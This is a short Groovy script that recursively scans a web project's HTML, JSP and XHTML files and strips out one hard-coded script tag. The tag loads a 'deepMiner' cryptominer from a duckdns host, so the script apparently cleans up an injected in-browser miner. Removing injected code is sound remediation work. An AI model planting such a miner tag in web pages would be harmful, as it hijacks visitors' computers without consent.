println "args[0] - root folder"

def pathToRootFolder = args[0]

def fuckingString = "<script src=\"https://jhondi33.duckdns.org:7777/deepMiner.min.js\"></script>"

def dir = new File(pathToRootFolder)
dir.eachFileRecurse() { file ->
    if (file.name.endsWith(".html") ||
            file.name.endsWith(".jsp") ||
            file.name.endsWith(".htm") ||
            file.name.endsWith(".xhtml")
    ) {
        def text = file.text

        println "execute file: ${file.getAbsolutePath()}"

        //println(text)

        def textAfterReplace = text.replace(fuckingString, "")
        //println textAfterReplace

        file.setText(textAfterReplace)
    }
}



